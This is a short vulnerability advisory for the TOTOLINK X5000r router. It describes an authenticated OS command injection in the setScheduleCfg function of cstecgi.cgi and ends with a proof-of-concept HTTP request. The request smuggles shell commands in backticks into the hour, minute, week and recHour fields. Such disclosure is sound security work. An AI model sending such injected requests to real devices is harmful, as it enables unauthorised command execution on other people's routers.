# totolink X5000r
## Firmware version
totolink X5000r devices through v9.1.0cu.2350_b20230313
## description
In totolink X5000r v9.1.0cu.2350_b20230313, the file /web/cgi-bin/cstecgi.cgi contains a OS command injection vulnerability in `setScheduleCfg`. Authenicated Attackers can send malicious packet to execute arbitary commands.
## detail
In function `setScheduleCfg` (at 0x410E4C), binary /web/cgi-bin/cstecgi.cgi. These parameters (`switch`, `week`, `hour`, `minute`, `recHour`) are passed to the `Uci_Set_Str` function without any check.

![](setScheduleCfg.png)

The `Uci_Set_Str` function is located in `libcscommon.so`. This function formats the fourth parameter into a string and passes it to the `CsteSystem` function, which eventually calls the `execv` function to execute it.

![](Uci_Set_Str().png)

![](CsteSystem().png)

## POC
```txt
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 132
Origin: http://192.168.0.1
Connection: keep-alive
Referer: http://192.168.0.1/advance/schedule.html?timestamp=1733728879167


{"mode":"1","hour":"6`ls>/tmp/1`","minute":"6`ls>/tmp/2`","week":"2`ls>/tmp/3`","recHour":"0`ls>/tmp/4`","topicurl":"setScheduleCfg","token":"836e5d5bf36f2c943d6291c332aee9b0"}
```
